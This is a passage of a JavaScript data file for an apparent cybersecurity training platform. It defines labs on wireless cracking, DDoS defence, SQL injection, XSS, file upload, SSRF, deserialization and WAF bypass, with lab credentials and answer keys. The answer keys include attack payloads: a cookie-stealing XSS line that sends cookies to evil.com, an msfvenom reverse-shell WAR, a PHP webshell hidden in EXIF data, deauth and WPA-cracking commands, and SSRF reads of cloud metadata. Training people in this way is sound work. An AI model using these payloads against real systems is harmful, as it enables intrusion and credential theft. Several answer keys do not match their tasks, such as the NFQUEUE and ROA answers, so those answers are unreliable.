      { title: "SQLi Rule", description: "Detect SQL injection in HTTP", correctAnswer: "alert http any any -> $HOME_NET any (msg:'SQL Injection Attempt'; flow:to_server,established; content:'SELECT'; http_uri; sid:1000002; rev:1;)", points: 200 },
      { title: "EVE Logger", description: "Configure eve.json logging", correctAnswer: "outputs: - eve-log: enabled: yes filetype: regular filename: eve.json", points: 150 },
      { title: "IPS Mode", description: "Configure IPS with NFQUEUE", correctAnswer: "af-packet: - interface: eth0 cluster-id: 99 defrag: yes", points: 200 }
    ],
  },
  {
    title: "Wireless Network Security Assessment",
    description: "Perform wireless network security assessments using Aircrack-ng suite.",
    dockerImage: "parrotsec/security",
    difficulty: 1150,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Capture and analyze wireless traffic, test WPA2 security, and identify wireless vulnerabilities.

### Environment
- Parrot Security OS
- Aircrack-ng suite, airmon-ng
- Credentials: root / wifi-sec-2024!

### Tasks
1. Put wireless interface into monitor mode
2. Scan for nearby wireless networks with airodump-ng
3. Capture WPA2 4-way handshake for a target network
4. Perform deauthentication attack to force handshake capture
5. Crack WPA2 handshake using dictionary attack with aircrack-ng
6. Analyze captured packets for management frame vulnerabilities
7. Detect evil twin access points
8. Recommend WPA3 and 802.11w protections

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Put wireless interface into monitor mode", "Scan for nearby wireless networks with airodump-ng", "Capture WPA2 4-way handshake for a target network", "Perform deauthentication attack to force handshake capture", "Crack WPA2 handshake using dictionary attack with aircrack-ng", "Analyze captured packets for management frame vulnerabilities", "Detect evil twin access points", "Recommend WPA3 and 802.11w protections"],
    credentials: [
      { service: "container", username: "root", password: "wifi-sec-2024!" }
    ],
    flags: [
      { title: "Monitor Mode", description: "Enable monitor mode on interface", correctAnswer: "airmon-ng start wlan0", points: 150 },
      { title: "Network Scanner", description: "Scan for wireless networks", correctAnswer: "airodump-ng wlan0mon", points: 100 },
      { title: "Handshake Capture", description: "Capture WPA2 handshake", correctAnswer: "airodump-ng -c <channel> --bssid <AP> -w capture wlan0mon", points: 250 },
      { title: "Deauth Attack", description: "Force deauthentication", correctAnswer: "aireplay-ng --deauth 5 -a <AP> wlan0mon", points: 200 },
      { title: "WPA2 Cracker", description: "Crack handshake with dictionary", correctAnswer: "aircrack-ng -w wordlist.txt capture-01.cap", points: 200 }
    ],
  },
  {
    title: "DDoS Mitigation & Traffic Analysis",
    description: "Analyze DDoS attack patterns and implement mitigation strategies at the network level.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Identify DDoS traffic patterns, configure rate limiting, and implement traffic filtering to maintain service availability.

### Environment
- Ubuntu 22.04 LTS
- tcpdump, iptables, nginx
- Credentials: root / ddos-mit-2024!

### Tasks
1. Capture network traffic during a simulated DDoS attack
2. Analyze packet captures to identify attack patterns (SYN flood, UDP amplification)
3. Configure iptables rate limiting for SYN packets
4. Set up SYN cookies to handle connection floods
5. Implement nginx limit_req and limit_conn directives
6. Create fail2ban rules to automatically block attacking IPs
7. Configure connection tracking table size limits
8. Generate a traffic analysis report with attack metrics

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Capture network traffic during a simulated DDoS attack", "Analyze packet captures to identify attack patterns (SYN flood, UDP amplification)", "Configure iptables rate limiting for SYN packets", "Set up SYN cookies to handle connection floods", "Implement nginx limit_req and limit_conn directives", "Create fail2ban rules to automatically block attacking IPs", "Configure connection tracking table size limits", "Generate a traffic analysis report with attack metrics"],
    credentials: [
      { service: "container", username: "root", password: "ddos-mit-2024!" }
    ],
    flags: [
      { title: "Traffic Capture", description: "Capture attack traffic with tcpdump", correctAnswer: "tcpdump -i eth0 -w attack.pcap", points: 100 },
      { title: "SYN Cookie", description: "Enable SYN cookies", correctAnswer: "sysctl -w net.ipv4.tcp_syncookies=1", points: 200 },
      { title: "Rate Limiter", description: "Configure SYN rate limiting", correctAnswer: "iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT", points: 200 },
      { title: "Nginx Limiter", description: "Set nginx rate limiting", correctAnswer: "limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;", points: 200 },
      { title: "Fail2Ban", description: "Create fail2ban DDoS filter", correctAnswer: "maxretry = 5 bantime = 3600", points: 200 }
    ],
  },
  {
    title: "Network Segmentation with VLANs",
    description: "Design and implement network segmentation using VLANs and inter-VLAN routing.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1250,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Create isolated network segments using VLANs and configure controlled communication between segments.

### Environment
- Ubuntu 22.04 LTS
- bridge-utils, vlan packages
- Credentials: root / vlan-sec-2024!

### Tasks
1. Create VLAN interfaces (10, 20, 30) on the host
2. Assign IP addresses to each VLAN interface
3. Configure a Linux bridge for VLAN routing
4. Set up firewall rules to control inter-VLAN traffic
5. Implement VLAN tagging with 802.1Q on a trunk port
6. Create a DMZ VLAN with restricted access to internal networks
7. Monitor inter-VLAN traffic with tcpdump
8. Document the network segmentation architecture

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Create VLAN interfaces (10, 20, 30) on the host", "Assign IP addresses to each VLAN interface", "Configure a Linux bridge for VLAN routing", "Set up firewall rules to control inter-VLAN traffic", "Implement VLAN tagging with 802.1Q on a trunk port", "Create a DMZ VLAN with restricted access to internal networks", "Monitor inter-VLAN traffic with tcpdump", "Document the network segmentation architecture"],
    credentials: [
      { service: "container", username: "root", password: "vlan-sec-2024!" }
    ],
    flags: [
      { title: "VLAN Creator", description: "Create VLAN interfaces", correctAnswer: "ip link add link eth0 name eth0.10 type vlan id 10", points: 150 },
      { title: "IP Assigner", description: "Assign IPs to VLANs", correctAnswer: "ip addr add 192.168.10.1/24 dev eth0.10", points: 100 },
      { title: "Bridge Builder", description: "Create bridge for VLAN routing", correctAnswer: "brctl addbr br0 && brctl addif br0 eth0.10 eth0.20", points: 200 },
      { title: "Firewall Segmenter", description: "Block inter-VLAN traffic", correctAnswer: "iptables -A FORWARD -i eth0.10 -o eth0.20 -j DROP", points: 200 },
      { title: "Traffic Monitor", description: "Monitor VLAN traffic", correctAnswer: "tcpdump -i eth0.10 -vv", points: 100 }
    ],
  },
  {
    title: "Packet Analysis with Wireshark/tshark",
    description: "Master network packet analysis using tshark for security investigation and troubleshooting.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1300,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Capture, filter, and analyze network packets to identify security incidents and protocol anomalies.

### Environment
- Ubuntu 22.04 LTS
- tshark (Wireshark CLI)
- Credentials: root / pcap-ana-2024!

### Tasks
1. Capture traffic on a specific interface with tshark
2. Apply display filters for HTTP, DNS, and TCP streams
3. Reconstruct TCP streams from captured traffic
4. Identify suspicious DNS queries (DGA, tunneling)
5. Extract files transferred over HTTP from packet captures
6. Analyze TLS handshake to identify weak cipher suites
7. Create IO graphs showing traffic patterns over time
8. Write a tshark script to automate security-relevant captures

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Capture traffic on a specific interface with tshark", "Apply display filters for HTTP, DNS, and TCP streams", "Reconstruct TCP streams from captured traffic", "Identify suspicious DNS queries (DGA, tunneling)", "Extract files transferred over HTTP from packet captures", "Analyze TLS handshake to identify weak cipher suites", "Create IO graphs showing traffic patterns over time", "Write a tshark script to automate security-relevant captures"],
    credentials: [
      { service: "container", username: "root", password: "pcap-ana-2024!" }
    ],
    flags: [
      { title: "Capture Starter", description: "Start packet capture", correctAnswer: "tshark -i eth0 -w /tmp/capture.pcap", points: 100 },
      { title: "HTTP Filter", description: "Filter HTTP traffic", correctAnswer: "tshark -r capture.pcap -Y http.request", points: 150 },
      { title: "Stream Reassembler", description: "Reconstruct TCP stream", correctAnswer: "tshark -r capture.pcap -z conv,tcp", points: 200 },
      { title: "DNS Analyzer", description: "Identify suspicious DNS", correctAnswer: "tshark -r capture.pcap -Y dns.qry.name -T fields -e dns.qry.name", points: 200 },
      { title: "File Extractor", description: "Extract files from capture", correctAnswer: "tshark -r capture.pcap --export-objects http,/tmp/extracted", points: 200 }
    ],
  },
  {
    title: "BGP Security & Route Hijacking Defense",
    description: "Understand BGP routing, identify route hijacking attacks, and implement RPKI protection.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1400,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Learn BGP fundamentals, detect prefix hijacking, and deploy RPKI-based route origin validation.

### Environment
- Ubuntu 22.04 LTS
- Bird daemon, RPKI tools
- Credentials: root / bgp-sec-2024!

### Tasks
1. Configure a basic BGP peering session with Bird
2. Announce a prefix and verify with a looking glass
3. Simulate a route hijacking attack by announcing a stolen prefix
4. Detect hijacked routes using BGP community tags and AS path analysis
5. Deploy an RPKI validator (Routinator)
6. Create ROA (Route Origin Authorization) records
7. Configure BGP route origin validation (RPKI-based)
8. Analyze BGP update messages for anomalies

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Configure a basic BGP peering session with Bird", "Announce a prefix and verify with a looking glass", "Simulate a route hijacking attack by announcing a stolen prefix", "Detect hijacked routes using BGP community tags and AS path analysis", "Deploy an RPKI validator (Routinator)", "Create ROA (Route Origin Authorization) records", "Configure BGP route origin validation (RPKI-based)", "Analyze BGP update messages for anomalies"],
    credentials: [
      { service: "container", username: "root", password: "bgp-sec-2024!" }
    ],
    flags: [
      { title: "BGP Peering", description: "Configure BGP session", correctAnswer: "protocol bgp { neighbor 192.168.1.2 as 65001; }", points: 200 },
      { title: "Prefix Announcer", description: "Announce a BGP prefix", correctAnswer: "bgp communities add NO_EXPORT", points: 150 },
      { title: "Hijack Simulator", description: "Simulate route hijack", correctAnswer: "birdc configure /etc/bird/hijack.conf", points: 250 },
      { title: "RPKI Deployer", description: "Deploy RPKI validator", correctAnswer: "apt-get install -y routinator", points: 200 },
      { title: "ROA Creator", description: "Create ROA record", correctAnswer: "rpki-client -e /var/lib/rpki-client/ -V 192.168.0.0/16 as 65000", points: 200 }
    ],
  },
  {
    title: "OWASP Juice Shop: Beginner Challenges",
    description: "Exploit common web vulnerabilities in the OWASP Juice Shop application.",
    dockerImage: "bkimminich/juice-shop",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Find and exploit beginner-level vulnerabilities in the OWASP Juice Shop including information disclosure and injection.

### Environment
- Juice Shop container running on port 3000
- Browser access to the application
- Credentials: attacker / juice-attacker-2024!

### Tasks
1. Find the Score Board page and identify hidden challenges
2. Perform a reflected XSS attack on the search function
3. Find the missing encoding on a hidden route
4. Access the administration page by manipulating cookies
5. Place an order with a negative total price
6. Retrieve a list of all user credentials via SQL injection
7. Exploit DOM-based XSS in the user feedback form
8. Find and exploit the insecure password reset mechanism

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Find the Score Board page and identify hidden challenges", "Perform a reflected XSS attack on the search function", "Find the missing encoding on a hidden route", "Access the administration page by manipulating cookies", "Place an order with a negative total price", "Retrieve a list of all user credentials via SQL injection", "Exploit DOM-based XSS in the user feedback form", "Find and exploit the insecure password reset mechanism"],
    credentials: [
      { service: "ssh", username: "attacker", password: "juice-attacker-2024!" }
    ],
    flags: [
      { title: "Scoreboard Hunter", description: "Find the hidden scoreboard", correctAnswer: "#/score-board", points: 100 },
      { title: "XSS Finder", description: "Perform reflected XSS on search", correctAnswer: "<script>alert('XSS')</script>", points: 150 },
      { title: "Cookie Manipulator", description: "Access admin page via cookie edit", correctAnswer: "document.cookie", points: 200 },
      { title: "Negative Price", description: "Place order with negative total", correctAnswer: "PUT /api/BasketItems/1 {quantity: -100}", points: 200 },
      { title: "SQL Injection", description: "Extract credentials via SQLi", correctAnswer: "' OR 1=1--", points: 250 }
    ],
  },
  {
    title: "SQL Injection Deep Dive",
    description: "Master various SQL injection techniques including union-based, blind, and second-order injection.",
    dockerImage: "vulnerables/web-dvwa",
    difficulty: 900,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Execute advanced SQL injection attacks across multiple injection points and database types.

### Environment
- DVWA application with MySQL backend
- Multiple injection difficulty levels
- Credentials: admin / password

### Tasks
1. Perform union-based SQL injection to extract database version and user
2. Exploit blind SQL injection using boolean-based techniques
3. Use time-based blind SQL injection when no output is visible
4. Extract table names and column names from the information schema
5. Dump user credentials from the users table
6. Perform second-order SQL injection through stored user input
7. Use SQLmap to automate injection detection and exploitation
8. Implement parameterized queries to fix the vulnerability

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform union-based SQL injection to extract database version and user", "Exploit blind SQL injection using boolean-based techniques", "Use time-based blind SQL injection when no output is visible", "Extract table names and column names from the information schema", "Dump user credentials from the users table", "Perform second-order SQL injection through stored user input", "Use SQLmap to automate injection detection and exploitation", "Implement parameterized queries to fix the vulnerability"],
    credentials: [
      { service: "ssh", username: "admin", password: "password" }
    ],
    flags: [
      { title: "Union Extractor", description: "Extract DB version with UNION", correctAnswer: "' UNION SELECT version(), NULL--", points: 150 },
      { title: "Blind Oracle", description: "Boolean-based blind injection", correctAnswer: "' AND 1=1--", points: 200 },
      { title: "Time Blinder", description: "Time-based blind injection", correctAnswer: "' AND SLEEP(5)--", points: 200 },
      { title: "Schema Dumper", description: "Extract table names", correctAnswer: "' UNION SELECT table_name FROM information_schema.tables--", points: 200 },
      { title: "Cred Stealer", description: "Dump user credentials", correctAnswer: "' UNION SELECT user, password FROM users--", points: 250 }
    ],
  },
  {
    title: "Cross-Site Scripting (XSS) Exploitation",
    description: "Identify and exploit all types of XSS vulnerabilities in web applications.",
    dockerImage: "vulnerables/web-dvwa",
    difficulty: 950,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Execute reflected, stored, and DOM-based XSS attacks and understand their impact on users.

### Environment
- DVWA application with XSS reflected and stored modules
- Browser with developer tools
- Credentials: admin / password

### Tasks
1. Execute reflected XSS via URL parameter injection
2. Bypass basic input filters using encoding and case variation
3. Exploit stored XSS through the guestbook comment field
4. Craft a cookie-stealing XSS payload
5. Perform DOM-based XSS by manipulating the page fragment
6. Use XSS to perform actions as another user (CSRF via XSS)
7. Test Content Security Policy bypass techniques
8. Implement proper output encoding to prevent XSS

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Execute reflected XSS via URL parameter injection", "Bypass basic input filters using encoding and case variation", "Exploit stored XSS through the guestbook comment field", "Craft a cookie-stealing XSS payload", "Perform DOM-based XSS by manipulating the page fragment", "Use XSS to perform actions as another user (CSRF via XSS)", "Test Content Security Policy bypass techniques", "Implement proper output encoding to prevent XSS"],
    credentials: [
      { service: "ssh", username: "admin", password: "password" }
    ],
    flags: [
      { title: "Reflected XSS", description: "Execute reflected XSS attack", correctAnswer: "<script>alert(document.cookie)</script>", points: 150 },
      { title: "Filter Bypass", description: "Bypass input filter", correctAnswer: "<ScRiPt>alert(1)</ScRiPt>", points: 200 },
      { title: "Stored XSS", description: "Plant persistent XSS payload", correctAnswer: "<img src=x onerror=alert(document.cookie)>", points: 200 },
      { title: "Cookie Stealer", description: "Steal cookies via XSS", correctAnswer: "<script>new Image().src='http://evil.com/?c='+document.cookie</script>", points: 250 },
      { title: "DOM XSS", description: "Exploit DOM-based XSS", correctAnswer: "#<img src=x onerror=alert(1)>", points: 200 }
    ],
  },
  {
    title: "Web Server Exploitation with Metasploitable",
    description: "Exploit vulnerabilities in Metasploitable's web services including Tomcat, PHP, and CGI.",
    dockerImage: "vulnerables/web-dvwa",
    difficulty: 1000,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Identify and exploit web server vulnerabilities including misconfigurations, outdated software, and weak credentials.

### Environment
- Metasploitable target with multiple vulnerable services
- Attacker with Metasploit Framework
- Credentials: msfadmin / msfadmin

### Tasks
1. Enumerate web server technologies using technology fingerprinting
2. Exploit default credentials on Apache Tomcat manager
3. Upload a WAR payload through Tomcat deploy function
4. Exploit PHP CGI argument injection (CVE-2012-1823)
5. Use directory traversal to access sensitive files
6. Exploit the Samba symbolic link vulnerability through web access
7. Leverage outdated ProFTPD for remote code execution
8. Compile findings into a vulnerability assessment report

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enumerate web server technologies using technology fingerprinting", "Exploit default credentials on Apache Tomcat manager", "Upload a WAR payload through Tomcat deploy function", "Exploit PHP CGI argument injection (CVE-2012-1823)", "Use directory traversal to access sensitive files", "Exploit the Samba symbolic link vulnerability through web access", "Leverage outdated ProFTPD for remote code execution", "Compile findings into a vulnerability assessment report"],
    credentials: [
      { service: "ssh", username: "msfadmin", password: "msfadmin" }
    ],
    flags: [
      { title: "Tech Finger", description: "Fingerprint web technologies", correctAnswer: "whatweb http://target", points: 100 },
      { title: "Tomcat Breaker", description: "Exploit Tomcat default creds", correctAnswer: "tomcat:tomcat", points: 200 },
      { title: "WAR Deployer", description: "Upload WAR payload via Tomcat", correctAnswer: "msfvenom -p java/shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war", points: 250 },
      { title: "CGI Exploiter", description: "Exploit PHP CGI vuln", correctAnswer: "?-s+file=/etc/passwd", points: 200 },
      { title: "Traversal Master", description: "Directory traversal to /etc/passwd", correctAnswer: "../../../../../../../etc/passwd", points: 200 }
    ],
  },
  {
    title: "API Security Testing (REST & GraphQL)",
    description: "Test RESTful and GraphQL APIs for common security vulnerabilities and broken access controls.",
    dockerImage: "node:20-alpine",
    difficulty: 1050,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Identify API security flaws including broken authentication, excessive data exposure, and injection vulnerabilities.

### Environment
- Node.js API server with REST and GraphQL endpoints
- Postman/curl for testing
- Credentials: api-test / api-sec-2024!

### Tasks
1. Discover API endpoints through documentation and fuzzing
2. Test for broken object level authorization (BOLA/IDOR)
3. Exploit mass assignment to modify unauthorized fields
4. Perform GraphQL introspection to discover hidden queries
5. Bypass rate limiting using parameter pollution
6. Test JWT token validation and identify algorithm confusion
7. Exploit server-side request forgery (SSRF) through image import
8. Document all findings following OWASP API Security Top 10

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Discover API endpoints through documentation and fuzzing", "Test for broken object level authorization (BOLA/IDOR)", "Exploit mass assignment to modify unauthorized fields", "Perform GraphQL introspection to discover hidden queries", "Bypass rate limiting using parameter pollution", "Test JWT token validation and identify algorithm confusion", "Exploit server-side request forgery (SSRF) through image import", "Document all findings following OWASP API Security Top 10"],
    credentials: [
      { service: "container", username: "api-test", password: "api-sec-2024!" }
    ],
    flags: [
      { title: "Endpoint Finder", description: "Discover hidden API endpoints", correctAnswer: "curl -X GET /api/v1/swagger.json", points: 100 },
      { title: "BOLA Exploiter", description: "Access other user data via IDOR", correctAnswer: "curl -H 'Authorization: Bearer <token>' /api/v1/users/2", points: 200 },
      { title: "Mass Assigner", description: "Modify role via mass assignment", correctAnswer: "{name:test,role:admin}", points: 200 },
      { title: "GraphQL Introspector", description: "Perform GraphQL introspection", correctAnswer: "{__schema{types{name,fields{name}}}}", points: 200 },
      { title: "JWT Confuser", description: "Exploit JWT algorithm confusion", correctAnswer: "none", points: 250 }
    ],
  },
  {
    title: "Webgoat: Authentication & Access Control",
    description: "Exploit authentication and authorization flaws in the Webgoat learning platform.",
    dockerImage: "webgoat/webgoat",
    difficulty: 1100,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Bypass authentication mechanisms, exploit access control flaws, and escalate privileges in web applications.

### Environment
- Webgoat application running on port 8080
- Burp Suite or equivalent proxy
- Credentials: guest / guest

### Tasks
1. Bypass login using SQL injection in the authentication form
2. Exploit a broken access control to access admin functions
3. Perform session fixation attack by setting a known session ID
4. Bypass password reset using insecure direct object reference
5. Escalate privileges by manipulating JWT claims
6. Exploit Insecure Direct Object Reference (IDOR) to access other users data
7. Perform horizontal privilege escalation through parameter manipulation
8. Implement secure session management to prevent these attacks

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Bypass login using SQL injection in the authentication form", "Exploit a broken access control to access admin functions", "Perform session fixation attack by setting a known session ID", "Bypass password reset using insecure direct object reference", "Escalate privileges by manipulating JWT claims", "Exploit Insecure Direct Object Reference (IDOR) to access other users data", "Perform horizontal privilege escalation through parameter manipulation", "Implement secure session management to prevent these attacks"],
    credentials: [
      { service: "ssh", username: "guest", password: "guest" }
    ],
    flags: [
      { title: "Login Bypass", description: "SQL injection in login", correctAnswer: "' OR '1'='1' OR '1'='1", points: 200 },
      { title: "Access Hijacker", description: "Access admin via broken ACL", correctAnswer: "/Webgoat/Controladores/admin", points: 200 },
      { title: "Session Fixer", description: "Perform session fixation", correctAnswer: "JSESSIONID=fixed-session-id", points: 200 },
      { title: "IDOR Explorer", description: "Access other user data via IDOR", correctAnswer: "/Webgoat/IDOR/user/2", points: 200 },
      { title: "JWT Forger", description: "Forge JWT claims for escalation", correctAnswer: "{role:Admin,user:admin}", points: 250 }
    ],
  },
  {
    title: "File Upload Vulnerabilities",
    description: "Exploit file upload functionality to achieve remote code execution on a web server.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1150,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Bypass file upload restrictions including MIME type validation, extension blacklists, and content inspection.

### Environment
- Apache/Nginx with PHP upload application
- Meterpreter or webshell payload
- Credentials: upload-test / upload-sec-2024!

### Tasks
1. Upload a PHP webshell by bypassing MIME type validation
2. Bypass extension blacklist by using alternative extensions (.phtml, .php5)
3. Embed code in image metadata to bypass content inspection
4. Use double extensions (shell.php.jpg) to bypass filtering
5. Exploit race condition in file processing to execute before deletion
6. Bypass SVG upload filter to inject JavaScript (XSS)
7. Chain file upload with LFI for remote code execution
8. Implement secure file upload with allowlist and execution prevention

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Upload a PHP webshell by bypassing MIME type validation", "Bypass extension blacklist by using alternative extensions (.phtml, .php5)", "Embed code in image metadata to bypass content inspection", "Use double extensions (shell.php.jpg) to bypass filtering", "Exploit race condition in file processing to execute before deletion", "Bypass SVG upload filter to inject JavaScript (XSS)", "Chain file upload with LFI for remote code execution", "Implement secure file upload with allowlist and execution prevention"],
    credentials: [
      { service: "container", username: "upload-test", password: "upload-sec-2024!" }
    ],
    flags: [
      { title: "MIME Bypasser", description: "Bypass MIME type check", correctAnswer: "Content-Type: image/jpeg with PHP content", points: 150 },
      { title: "Extension Mixer", description: "Use alternative PHP extension", correctAnswer: "shell.phtml", points: 200 },
      { title: "EXIF Injector", description: "Embed code in image EXIF", correctAnswer: "exiftool -Comment='<?php system($_GET[cmd]); ?>' image.jpg", points: 250 },
      { title: "Double Ext", description: "Use double extension", correctAnswer: "shell.php.jpg", points: 200 },
      { title: "SVG XSSer", description: "Upload malicious SVG", correctAnswer: "<svg onload='alert(document.cookie)'/>", points: 150 }
    ],
  },
  {
    title: "Server-Side Request Forgery (SSRF)",
    description: "Exploit SSRF vulnerabilities to access internal services and sensitive data.",
    dockerImage: "node:20-alpine",
    difficulty: 1200,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Chain SSRF with other vulnerabilities to access internal metadata endpoints and private services.

### Environment
- Node.js application with URL import feature
- Internal services on localhost
- Credentials: ssrf-user / ssrf-sec-2024!

### Tasks
1. Exploit SSRF to access cloud instance metadata (169.254.169.254)
2. Use SSRF to port scan internal network from the application server
3. Bypass SSRF filters using URL encoding and alternate IP representations
4. Chain SSRF with internal service discovery to find hidden APIs
5. Exploit SSRF to read local files via file:// protocol
6. Use DNS rebinding to bypass host validation
7. Access internal admin panels through the SSRF vulnerability
8. Implement SSRF defenses using allowlists and network segmentation

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Exploit SSRF to access cloud instance metadata (169.254.169.254)", "Use SSRF to port scan internal network from the application server", "Bypass SSRF filters using URL encoding and alternate IP representations", "Chain SSRF with internal service discovery to find hidden APIs", "Exploit SSRF to read local files via file:// protocol", "Use DNS rebinding to bypass host validation", "Access internal admin panels through the SSRF vulnerability", "Implement SSRF defenses using allowlists and network segmentation"],
    credentials: [
      { service: "container", username: "ssrf-user", password: "ssrf-sec-2024!" }
    ],
    flags: [
      { title: "Metadata Accessor", description: "Access cloud metadata via SSRF", correctAnswer: "http://169.254.169.254/latest/meta-data/", points: 200 },
      { title: "Port Scanner", description: "Internal port scan via SSRF", correctAnswer: "http://localhost:22", points: 150 },
      { title: "Filter Bypasser", description: "Bypass SSRF filter with encoding", correctAnswer: "http://127.0.0.1", points: 200 },
      { title: "File Reader", description: "Read local files via SSRF", correctAnswer: "file:///etc/passwd", points: 200 },
      { title: "Protocol Changer", description: "Use gopher for internal exploitation", correctAnswer: "gopher://localhost:3306/_QUIT", points: 250 }
    ],
  },
  {
    title: "Insecure Deserialization Attacks",
    description: "Exploit insecure deserialization vulnerabilities to achieve remote code execution.",
    dockerImage: "node:20-alpine",
    difficulty: 1250,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Craft serialized payloads to exploit PHP, Java, and Node.js deserialization flaws.

### Environment
- Application with multiple deserialization endpoints
- Tools: ysoserial, phpggc
- Credentials: deser-test / deser-sec-2024!

### Tasks
1. Analyze serialized cookie format to identify the serialization method
2. Craft a PHP object injection payload to execute system commands
3. Exploit Java deserialization using ysoserial gadget chains
4. Perform Node.js prototype pollution leading to deserialization RCE
5. Use orjson/typeddict bypass for Python deserialization attacks
6. Modify serialized session tokens to escalate privileges
7. Chain deserialization with command injection for full system compromise
8. Implement input validation and integrity checks for serialized data

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Analyze serialized cookie format to identify the serialization method", "Craft a PHP object injection payload to execute system commands", "Exploit Java deserialization using ysoserial gadget chains", "Perform Node.js prototype pollution leading to deserialization RCE", "Use orjson/typeddict bypass for Python deserialization attacks", "Modify serialized session tokens to escalate privileges", "Chain deserialization with command injection for full system compromise", "Implement input validation and integrity checks for serialized data"],
    credentials: [
      { service: "container", username: "deser-test", password: "deser-sec-2024!" }
    ],
    flags: [
      { title: "PHP Injector", description: "Craft PHP object injection", correctAnswer: "O:8:UserData:1:{s:4:name;s:6:system;}", points: 250 },
      { title: "Java Gadget", description: "Use ysoserial gadget chain", correctAnswer: "java -jar ysoserial.jar CommonsCollections1 'id' | base64", points: 250 },
      { title: "Node Polluter", description: "Prototype pollution payload", correctAnswer: "{__proto__:{shell:child_process}}", points: 200 },
      { title: "Cookie Modifier", description: "Modify serialized session", correctAnswer: "O:4:Admin:1:{s:4:role;s:5:admin;}", points: 200 },
      { title: "Integrity Checker", description: "Bypass HMAC on serialized data", correctAnswer: "padding oracle on MAC verification", points: 250 }
    ],
  },
  {
    title: "Web Application Firewall Bypass",
    description: "Test and bypass common WAF rules using encoding, fragmentation, and obfuscation techniques.",
    dockerImage: "nginx:1.27-alpine",
    difficulty: 1300,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Bypass web application firewall protections to deliver payloads and test defense effectiveness.

### Environment
- Nginx with ModSecurity or equivalent WAF
- Attack payloads: SQLi, XSS, command injection
- Credentials: waf-test / waf-bypass-2024!

### Tasks
1. Identify WAF type and version through fingerprinting
2. Bypass SQL injection filters using URL encoding and case variation
3. Use HTTP parameter pollution to evade WAF inspection
4. Exploit chunked transfer encoding to fragment malicious payloads
5. Bypass keyword filters using inline comments
6. Use Unicode and overlong UTF-8 encoding to bypass filters
7. Exploit parser differentials between WAF and backend application
8. Document bypass techniques and recommend WAF rule improvements

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
